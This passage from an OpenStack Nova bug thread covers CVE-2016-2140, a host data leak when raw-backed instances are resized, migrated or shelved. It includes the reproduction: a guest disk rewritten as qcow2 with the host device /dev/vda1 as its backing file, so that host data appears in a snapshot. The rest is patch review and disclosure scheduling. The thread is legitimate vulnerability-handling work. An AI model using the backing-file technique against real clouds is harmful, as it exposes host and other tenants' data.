# openstack-config --get /etc/nova/nova.conf libvirt use\_cow\_images

False

# qemu-img info /var/lib/nova/instances/f531dd97-3e5c-4f2c-88fb-740e97c3f0d2/disk

image: /var/lib/nova/instances/f531dd97-3e5c-4f2c-88fb-740e97c3f0d2/disk

file format: qcow2

virtual size: 100G (107374182400 bytes)

disk size: 5.0G

cluster\_size: 65536

backing file: /dev/vda1

backing file format: raw

Format specific information:

    compat: 1.1

    lazy refcounts: false

# qemu-img info /var/lib/nova/instances/snapshots/tmpSLRPxG/f345630013ca4fe0a29b203e2b3afa61

image: /var/lib/nova/instances/snapshots/tmpSLRPxG/f345630013ca4fe0a29b203e2b3afa61

file format: qcow2

virtual size: 100G (107374182400 bytes)

disk size: 7.5G

cluster\_size: 65536

Format specific information:

    compat: 1.1

    lazy refcounts: false

The snapshot is still growing and likely to contain the controller disk, I'll check again tomorrow if the user can retrieve it.

And it seems like the shelve issue is real and not fixed by the propose patch.
After overwritting the root disk of an instance (using vda1 as backing file), here is what the shelve action produce:
7084 ? Ssl 1:05 /usr/bin/python /usr/bin/nova-compute
11792 ? Sl 2:40 \\_ qemu-img convert -f qcow2 -O qcow2 \
/var/lib/nova/instances/f531dd97-3e5c-4f2c-88fb-740e97c3f0d2/disk \
/var/lib/nova/instances/snapshots/tmpSLRPxG/f345630013ca4fe0a29b203e2b3afa61
# openstack-config --get /etc/nova/nova.conf libvirt use\_cow\_images
False
# qemu-img info /var/lib/nova/instances/f531dd97-3e5c-4f2c-88fb-740e97c3f0d2/disk
image: /var/lib/nova/instances/f531dd97-3e5c-4f2c-88fb-740e97c3f0d2/disk
file format: qcow2
virtual size: 100G (107374182400 bytes)
disk size: 5.0G
cluster\_size: 65536
backing file: /dev/vda1
backing file format: raw
Format specific information:
compat: 1.1
lazy refcounts: false
# qemu-img info /var/lib/nova/instances/snapshots/tmpSLRPxG/f345630013ca4fe0a29b203e2b3afa61
image: /var/lib/nova/instances/snapshots/tmpSLRPxG/f345630013ca4fe0a29b203e2b3afa61
file format: qcow2
virtual size: 100G (107374182400 bytes)
disk size: 7.5G
cluster\_size: 65536
Format specific information:
compat: 1.1
lazy refcounts: false
The snapshot is still growing and likely to contain the controller disk, I'll check again tomorrow if the user can retrieve it.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Booth (mbooth-9)](https://launchpad.net/~mbooth-9) wrote on 2016-02-26: |  |  | [#31](/nova/%2Bbug/1548450/comments/31) |
| --- | --- | --- | --- |

Sean, Dan B,

The first stage goal of my libvirt storage pools series is to promote disk.info to a per-instance storage policy. Critically, once I have finished the refactor of Image.cache() I will be able to pull the management of disk.info out of the storage classes and promote it to what is currently Backend. With that in place, we will have enough context to create disk.info \*before\* creating the disk. Also, as discussed with Dan S, I am expanding the data that it stores to include not just format, but also which backend it uses, and its size. With this metadata stored persistently independent of the disk itself we will never have to inspect a disk with qemu-img info, and this class of bug will go away.

There is a separate discussion to be had around where the best place to store this kind of information is. disk.info is what we have now, so I'm running with that. It would be ideal if we could take it straight out of libvirt. Unfortunately though, because we don't use persistent domains we lose all of this information every time the instance shuts down. We could potentially use instance system metadata, and I will look into that. For today, though, I'm working on a Mitaka patch which understands an expanded format of disk.info which I intend to use in Newton. If we ultimately choose to move the data elsewhere that's fine, but the data needs to exist, and the code needs to be restructured so that it can use it safely.

The problem with the current code is the Image.cache() function. This function does everything for all backends. It is passed a callback function which creates something by some means. The cache() function does not know what it creates, or where it comes from. This means that, as in the case of the poorly-named Raw backend[1], if cache() is creating an image-backed disk whose format is dependent on the format of the image it is downloading, it does not have enough context to know:

1. What the expected format is of the image that it is downloading.

2. That it is even downloading an image at all.

Its only option with the current structure is to call the callback and test what it got. My series splits this into create\_from\_func() for ephemeral and swap disks, and create\_from\_image() for images. This gives the backend enough context to know what it is creating before it creates it, so it can safely create and use the metadata described above. The first part of that, create\_from\_func() is here: <https://review.openstack.org/#/c/282580/> . It needs updating and it's not going to make Mitaka, but I stress that the disk.info patch which I should hopefully post today is required in Mitaka in order to be able to make these changes in Newton.

[1] <https://review.openstack.org/#/c/279626/>

Sean, Dan B,
The first stage goal of my libvirt storage pools series is to promote disk.info to a per-instance storage policy. Critically, once I have finished the refactor of Image.cache() I will be able to pull the management of disk.info out of the storage classes and promote it to what is currently Backend. With that in place, we will have enough context to create disk.info \*before\* creating the disk. Also, as discussed with Dan S, I am expanding the data that it stores to include not just format, but also which backend it uses, and its size. With this metadata stored persistently independent of the disk itself we will never have to inspect a disk with qemu-img info, and this class of bug will go away.
There is a separate discussion to be had around where the best place to store this kind of information is. disk.info is what we have now, so I'm running with that. It would be ideal if we could take it straight out of libvirt. Unfortunately though, because we don't use persistent domains we lose all of this information every time the instance shuts down. We could potentially use instance system metadata, and I will look into that. For today, though, I'm working on a Mitaka patch which understands an expanded format of disk.info which I intend to use in Newton. If we ultimately choose to move the data elsewhere that's fine, but the data needs to exist, and the code needs to be restructured so that it can use it safely.
The problem with the current code is the Image.cache() function. This function does everything for all backends. It is passed a callback function which creates something by some means. The cache() function does not know what it creates, or where it comes from. This means that, as in the case of the poorly-named Raw backend[1], if cache() is creating an image-backed disk whose format is dependent on the format of the image it is downloading, it does not have enough context to know:
1. What the expected format is of the image that it is downloading.
2. That it is even downloading an image at all.
Its only option with the current structure is to call the callback and test what it got. My series splits this into create\_from\_func() for ephemeral and swap disks, and create\_from\_image() for images. This gives the backend enough context to know what it is creating before it creates it, so it can safely create and use the metadata described above. The first part of that, create\_from\_func() is here: https://review.openstack.org/#/c/282580/ . It needs updating and it's not going to make Mitaka, but I stress that the disk.info patch which I should hopefully post today is required in Mitaka in order to be able to make these changes in Newton.
[1] https://review.openstack.org/#/c/279626/

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Lee Yarwood (lyarwood)](https://launchpad.net/~lyarwood) wrote on 2016-02-26: |  |  | [#32](/nova/%2Bbug/1548450/comments/32) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/nova/%2Bbug/1548450/comments/32/%2Bdownload) (4.5 KiB)

Thanks Tristan, was this on your rdo kilo env? This looks like you've hit OSSA 2016-001 / bug#1524274, which package version are you using? Anything prior to 2015.1.3 will hit this, I'm following up with the RDO team to ensure this version is available now.

Looking into the unshelve case we appear protected by a check within nova/virt/images.fetch\_to\_raw that correctly detects that a backing\_file is now listed and blocks any attempt at unshelving the instance :

2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [req-e3d11cbb-3a55-4eaa-ac99-592c751209ea 4e15d42d6f2d40c781b3097315a835af 37e7ea4bcdfc471191ea1267e7e6b4e0 - - -] [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] Instance failed to spawn

2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] Traceback (most recent call last):

2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/nova/compute/manager.py", line 4316, in \_unshelve\_instance

2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] block\_device\_info=block\_device\_info)

2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/nova/virt/libvirt/driver.py", line 2516, in spawn

2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] admin\_pass=admin\_password)

2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/nova/virt/libvirt/driver.py", line 2940, in \_create\_image

2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] instance, size, fallback\_from\_host)

2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/nova/virt/libvirt/driver.py", line 6409, in \_try\_fetch\_image\_cache

2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] size=size)

2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/nova/virt/libvirt/imagebackend.py", line 240, in cache

2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] \*args, \*\*kwargs)

2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/nova/virt/libvirt/imagebackend.py", line 472, in create\_image

2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] prepare\_template(target=base, max\_size=size, \*args, \*\*kwargs)

2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/oslo\_concurrency/lockutils.py", line 254, in inner

2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-20...

[Read more...](/nova/%2Bbug/1548450/comments/32)

Thanks Tristan, was this on your rdo kilo env? This looks like you've hit OSSA 2016-001 / bug#1524274, which package version are you using? Anything prior to 2015.1.3 will hit this, I'm following up with the RDO team to ensure this version is available now.
Looking into the unshelve case we appear protected by a check within nova/virt/images.fetch\_to\_raw that correctly detects that a backing\_file is now listed and blocks any attempt at unshelving the instance :
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [req-e3d11cbb-3a55-4eaa-ac99-592c751209ea 4e15d42d6f2d40c781b3097315a835af 37e7ea4bcdfc471191ea1267e7e6b4e0 - - -] [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] Instance failed to spawn
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] Traceback (most recent call last):
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/nova/compute/manager.py", line 4316, in \_unshelve\_instance
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] block\_device\_info=block\_device\_info)
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/nova/virt/libvirt/driver.py", line 2516, in spawn
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] admin\_pass=admin\_password)
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/nova/virt/libvirt/driver.py", line 2940, in \_create\_image
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] instance, size, fallback\_from\_host)
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/nova/virt/libvirt/driver.py", line 6409, in \_try\_fetch\_image\_cache
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] size=size)
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/nova/virt/libvirt/imagebackend.py", line 240, in cache
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] \*args, \*\*kwargs)
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/nova/virt/libvirt/imagebackend.py", line 472, in create\_image
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] prepare\_template(target=base, max\_size=size, \*args, \*\*kwargs)
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/oslo\_concurrency/lockutils.py", line 254, in inner
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] return f(\*args, \*\*kwargs)
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/nova/virt/libvirt/imagebackend.py", line 230, in fetch\_func\_sync
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] fetch\_func(target=target, \*args, \*\*kwargs)
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/nova/virt/libvirt/utils.py", line 406, in fetch\_image
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] max\_size=max\_size)
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/nova/virt/images.py", line 126, in fetch\_to\_raw
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] {'fmt': fmt, 'backing\_file': backing\_file}))
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] ImageUnacceptable: Image 2cb1fb9e-f628-4d3f-8de8-09070c5de7fa is unacceptable: fmt=qcow2 backed by: /dev/sda3
So it looks like we still only have the live and cold migration cases to fix at the moment.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Booth (mbooth-9)](https://launchpad.net/~mbooth-9) wrote on 2016-02-26: |  |  | [#33](/nova/%2Bbug/1548450/comments/33) |
| --- | --- | --- | --- |

Just to clarify Lee's last, I still consider the unshelve case a bug. However, it's not an exploitable bug because of the checking in fetch\_to\_raw. We should fix it, but given that it's substantially more complex than all the other cases I don't think we need to deal with it via this process.

Just to clarify Lee's last, I still consider the unshelve case a bug. However, it's not an exploitable bug because of the checking in fetch\_to\_raw. We should fix it, but given that it's substantially more complex than all the other cases I don't think we need to deal with it via this process.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-02-26: |  |  | [#34](/nova/%2Bbug/1548450/comments/34) |
| --- | --- | --- | --- |

Lee, you are correct, I tested the shelve issue against openstack-nova-api-2015.1.1-1.el7.noarch.

But if it's not exploitable, then it seems like the impact description in comment #11 still holds.

Does the patch fix cold and live migrate issue ?

If so, then it may need better commit message and also clean backports for stable/liberty and stable/kilo.

Lee, you are correct, I tested the shelve issue against openstack-nova-api-2015.1.1-1.el7.noarch.
But if it's not exploitable, then it seems like the impact description in comment #11 still holds.
Does the patch fix cold and live migrate issue ?
If so, then it may need better commit message and also clean backports for stable/liberty and stable/kilo.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Lee Yarwood (lyarwood)](https://launchpad.net/~lyarwood) wrote on 2016-02-26: |  |  | [#35](/nova/%2Bbug/1548450/comments/35) |
| --- | --- | --- | --- |

Correct, the impact statement is still correct. The patch fixes both cold (including resize) and live migrations. I'll add a commit message, backport to liberty and kilo now.

Correct, the impact statement is still correct. The patch fixes both cold (including resize) and live migrations. I'll add a commit message, backport to liberty and kilo now.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Lee Yarwood (lyarwood)](https://launchpad.net/~lyarwood) wrote on 2016-03-01: |  |  | [#39](/nova/%2Bbug/1548450/comments/39) |
| --- | --- | --- | --- |

Tristian, apologies for the delay, I have finally attached the master, stable/liberty and stable/kilo patches I've been working on after completing some additional devstack testing for the master patch.

Tristian, apologies for the delay, I have finally attached the master, stable/liberty and stable/kilo patches I've been working on after completing some additional devstack testing for the master patch.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Booth (mbooth-9)](https://launchpad.net/~mbooth-9) wrote on 2016-03-01: |  |  | [#40](/nova/%2Bbug/1548450/comments/40) |
| --- | --- | --- | --- |

Still +1 here on the above patches. I feel like we should propose a release date.

Still +1 here on the above patches. I feel like we should propose a release date.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-03-01: |  |  | [#41](/nova/%2Bbug/1548450/comments/41) |
| --- | --- | --- | --- |

Thanks Lee, I'm currently waiting for tox results on all three patchs. CVE has been requested with impact description from comment #11.

If we could send the pre-OSSA out by Friday, I'd like to propose this disclosure date:

2016-03-09, 1500 UTC

Thanks Lee, I'm currently waiting for tox results on all three patchs. CVE has been requested with impact description from comment #11.
If we could send the pre-OSSA out by Friday, I'd like to propose this disclosure date:
2016-03-09, 1500 UTC

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-03-01: |  |  | [#42](/nova/%2Bbug/1548450/comments/42) |
| --- | --- | --- | --- |

Not sure if it's related, but stable/kilo unit tests are failing with:

==============================

Failed 1 tests - output below:

==============================

nova.tests.unit.virt.libvirt.test\_driver.LibvirtDriverTestCase.test\_migrate\_disk\_and\_power\_off\_resize\_copy\_disk\_info

--------------------------------------------------------------------------------------------------------------------

Captured pythonlogging:

~~~~~~~~~~~~~~~~~~~~~~~

    2016-03-01 15:16:29,413 WARNING [nova.virt.libvirt.firewall] Libvirt module could not be loaded. NWFilterFirewall will not work correctly.

Captured traceback:

~~~~~~~~~~~~~~~~~~~

    Traceback (most recent call last):

      File "/home/centos/cve/nova\_kilo/.tox/py27/lib/python2.7/site-packages/mock.py", line 1201, in patched

        return func(\*args, \*\*keywargs)

      File "nova/tests/unit/virt/libvirt/test\_driver.py", line 11683, in test\_migrate\_disk\_and\_power\_off\_resize\_copy\_disk\_info

        on\_completion=mock.ANY, compression=mock.ANY)

      File "/home/centos/cve/nova\_kilo/.tox/py27/lib/python2.7/site-packages/mock.py", line 891, in assert\_any\_call

        '%s call not found' % expected\_string

    AssertionError: copy\_image(u'/test\_resize/disk.info', u'/test/disk.info', on\_execute=<ANY>, host=<mock.\_Sentinel object at 0x26b27d0>, on\_completion=<ANY>, compres

sion=<ANY>) call not found

Not sure if it's related, but stable/kilo unit tests are failing with:
==============================
Failed 1 tests - output below:
==============================
nova.tests.unit.virt.libvirt.test\_driver.LibvirtDriverTestCase.test\_migrate\_disk\_and\_power\_off\_resize\_copy\_disk\_info
--------------------------------------------------------------------------------------------------------------------
Captured pythonlogging:
~~~~~~~~~~~~~~~~~~~~~~~
2016-03-01 15:16:29,413 WARNING [nova.virt.libvirt.firewall] Libvirt module could not be loaded. NWFilterFirewall will not work correctly.
Captured traceback:
~~~~~~~~~~~~~~~~~~~
Traceback (most recent call last):
File "/home/centos/cve/nova\_kilo/.tox/py27/lib/python2.7/site-packages/mock.py", line 1201, in patched
return func(\*args, \*\*keywargs)
File "nova/tests/unit/virt/libvirt/test\_driver.py", line 11683, in test\_migrate\_disk\_and\_power\_off\_resize\_copy\_disk\_info
on\_completion=mock.ANY, compression=mock.ANY)
File "/home/centos/cve/nova\_kilo/.tox/py27/lib/python2.7/site-packages/mock.py", line 891, in assert\_any\_call
'%s call not found' % expected\_string
AssertionError: copy\_image(u'/test\_resize/disk.info', u'/test/disk.info', on\_execute=<ANY>, host=<mock.\_Sentinel object at 0x26b27d0>, on\_completion=<ANY>, compres
sion=<ANY>) call not found

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Lee Yarwood (lyarwood)](https://launchpad.net/~lyarwood) wrote on 2016-03-01: |  |  | [#43](/nova/%2Bbug/1548450/comments/43) |
| --- | --- | --- | --- |

Apologies, that's another conflict, the compress argument was added to libvirt\_utils.copy\_image in Liberty, removing this and updating the commit message now.

Apologies, that's another conflict, the compress argument was added to libvirt\_utils.copy\_image in Liberty, removing this and updating the commit message now.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Lee Yarwood (lyarwood)](https://launchpad.net/~lyarwood) wrote on 2016-03-01: |  |  | [#44](/nova/%2Bbug/1548450/comments/44) |
| --- | --- | --- | --- |

I've updated and attached the Kilo patch, apologies again.

I've updated and attached the Kilo patch, apologies again.

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2016-03-01

| **summary**: | Host data leak during resize/migrate for raw-backed instances+ (CVE-2016-2140) |
| --- | --- |
| Changed in ossa: | |
| **status**: | Confirmed → In Progress |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-03-01:  [**Re: Host data leak during resize/migrate for raw-backed instances (CVE-2016-2140)**](/nova/%2Bbug/1548450/comments/45) |  |  | [#45](/nova/%2Bbug/1548450/comments/45) |
| --- | --- | --- | --- |

Running tox -epy27 with patch in comment #44:

  py27: commands succeeded

  pep8: commands succeeded

  congratulations :)

Assuming these patchs get pre-approved soon, is 2016-03-09, 1500 UTC too early for disclosure date ?

Running tox -epy27 with patch in comment #44:
py27: commands succeeded
pep8: commands succeeded
congratulations :)
Assuming these patchs get pre-approved soon, is 2016-03-09, 1500 UTC too early for disclosure date ?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Booth (mbooth-9)](https://launchpad.net/~mbooth-9) wrote on 2016-03-02: |  |  | [#46](/nova/%2Bbug/1548450/comments/46) |
| --- | --- | --- | --- |

2016-03-09 works for me, but I feel we could even go sooner than that assuming we get the pre-approval. What's the schedule like?

2016-03-09 works for me, but I feel we could even go sooner than that assuming we get the pre-approval. What's the schedule like?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-03-02: |  |  | [#47](/nova/%2Bbug/1548450/comments/47) |
| --- | --- | --- | --- |

Matthew, if the pre-OSSA is sent between Monday and Thursday, we could disclose the next Tuesday.

And if it's sent early on Friday, it can be disclosed next Wednesday.

Finally, if it's sent late Friday or early enough Monday, it can be disclosed the next Thursday.

Matthew, if the pre-OSSA is sent between Monday and Thursday, we could disclose the next Tuesday.
And if it's sent early on Friday, it can be disclosed next Wednesday.
Finally, if it's sent late Friday or early enough Monday, it can be disclosed the next Thursday.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Andrew Laski (alaski)](https://launchpad.net/~alaski) wrote on 2016-03-02: |  |  | [#48](/nova/%2Bbug/1548450/comments/48) |
| --- | --- | --- | --- |

I will echo what was said by Dan and I previously: it would be preferable to recreate disk.info rather than copy it because in an upgrade scenario if the format changes you may be copying a format that the destination compute does not understand. If this was not a security fix I would hold on that point until we could reach a consensus on the approach. However I will just note my disagreement with the approach here but say that the patch looks good to me for addressing the bug.

I will echo what was said by Dan and I previously: it would be preferable to recreate disk.info rather than copy it because in an upgrade scenario if the format changes you may be copying a format that the destination compute does not understand. If this was not a security fix I would hold on that point until we could reach a consensus on the approach. However I will just note my disagreement with the approach here but say that the patch looks good to me for addressing the bug.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-03-02: |  |  | [#49](/nova/%2Bbug/1548450/comments/49) |
| --- | --- | --- | --- |

Thank you Andrew for reading through this, is the disk.info format changed between kilo and mitaka release ? If there are no foreseeable upgrade breakage, then I would prefer we fix the immediate issue and put that "disk.info rewrite" story on top of nova backlog.

So if that's ok with you, let's send the pre-OSSA today with a disclosure date set to:

2016-03-08, 1500 UTC

Thank you Andrew for reading through this, is the disk.info format changed between kilo and mitaka release ? If there are no foreseeable upgrade breakage, then I would prefer we fix the immediate issue and put that "disk.info rewrite" story on top of nova backlog.
So if that's ok with you, let's send the pre-OSSA today with a disclosure date set to:
2016-03-08, 1500 UTC

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Andrew Laski (alaski)](https://launchpad.net/~alaski) wrote on 2016-03-02: |  |  | [#50](/nova/%2Bbug/1548450/comments/50) |
| --- | --- | --- | --- |

No, the disk.info format has not changed and there is no foreseeable upgrade breakage. The copy is just something that may need to be changed to a recreate later if there are plans to update disk.info at some point.

I'm okay with moving forward with this.

No, the disk.info format has not changed and there is no foreseeable upgrade breakage. The copy is just something that may need to be changed to a recreate later if there are plans to update disk.info at some point.
I'm okay with moving forward with this.

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2016-03-02

| Changed in ossa: | |
| --- | --- |
| **status**: | In Progress → Fix Committed |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Lee Yarwood (lyarwood)](https://launchpad.net/~lyarwood) wrote on 2016-03-04: |  |  | [#51](/nova/%2Bbug/1548450/comments/51) |
| --- | --- | --- | --- |

* [0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-master.patch](https://bugs.launchpad.net/nova/%2Bbug/1548450/%2Battachment/4588377/%2Bfiles/0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-master.patch)
  [Edit](/nova/%2Bbug/1548450/%2Battachment/4588377)
  (8.2 KiB,
  text/plain)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Lee Yarwood (lyarwood)](https://launchpad.net/~lyarwood) wrote on 2016-03-04: |  |  | [#52](/nova/%2Bbug/1548450/comments/52) |
| --- | --- | --- | --- |

* [0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-liberty.patch](https://bugs.launchpad.net/nova/%2Bbug/1548450/%2Battachment/4588378/%2Bfiles/0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-liberty.patch)
  [Edit](/nova/%2Bbug/1548450/%2Battachment/4588378)
  (8.2 KiB,
  text/plain)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Lee Yarwood (lyarwood)](https://launchpad.net/~lyarwood) wrote on 2016-03-04: |  |  | [#53](/nova/%2Bbug/1548450/comments/53) |
| --- | --- | --- | --- |

* [0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-kilo.patch](https://bugs.launchpad.net/nova/%2Bbug/1548450/%2Battachment/4588379/%2Bfiles/0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-kilo.patch)
  [Edit](/nova/%2Bbug/1548450/%2Battachment/4588379)
  (8.3 KiB,
  text/plain)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Lee Yarwood (lyarwood)](https://launchpad.net/~lyarwood) wrote on 2016-03-04: |  |  | [#54](/nova/%2Bbug/1548450/comments/54) |
| --- | --- | --- | --- |

After additional code review from mbooth I've updated the attached patches. The only change made is to move the disk\_info recreation logic within pre\_live\_migration out of the `if not is\_shared\_block\_storage` block. This is to avoid any potential future issues with disk\_info not being recreated if an imagebackend is added that uses shared block storage but still uses disk.info.

After additional code review from mbooth I've updated the attached patches. The only change made is to move the disk\_info recreation logic within pre\_live\_migration out of the `if not is\_shared\_block\_storage` block. This is to avoid any potential future issues with disk\_info not being recreated if an imagebackend is added that uses shared block storage but still uses disk.info.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-03-04: |  |  | [#55](/nova/%2Bbug/1548450/comments/55) |
| --- | --- | --- | --- |

Thank you Lee for the update, I confirm the new patchs succeed py27 and pep8 tests.

Andrew (or another Nova core), could you please have a look and pre-approve those new version ?

Since the previous patchs have already been shared with the stakeholder list, we'll have to follow-up with the new version and probably extend the disclosure date.

If this can be done by early Monday, the new disclosure date would be: 2016-03-10, 1500UTC

Otherwise, the earliest disclosure date would be: 2016-03-15, 1500UTC

Thank you Lee for the update, I confirm the new patchs succeed py27 and pep8 tests.
Andrew (or another Nova core), could you please have a look and pre-approve those new version ?
Since the previous patchs have already been shared with the stakeholder list, we'll have to follow-up with the new version and probably extend the disclosure date.
If this can be done by early Monday, the new disclosure date would be: 2016-03-10, 1500UTC
Otherwise, the earliest disclosure date would be: 2016-03-15, 1500UTC

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Andrew Laski (alaski)](https://launchpad.net/~alaski) wrote on 2016-03-07: |  |  | [#56](/nova/%2Bbug/1548450/comments/56) |
| --- | --- | --- | --- |

The new patches look good to me. I would prefer if there was a second reviewer on these who is more familiar with the libvirt driver than I am but I'm +1 on them.

The new patches look good to me. I would prefer if there was a second reviewer on these who is more familiar with the libvirt driver than I am but I'm +1 on them.

Revision history for this message
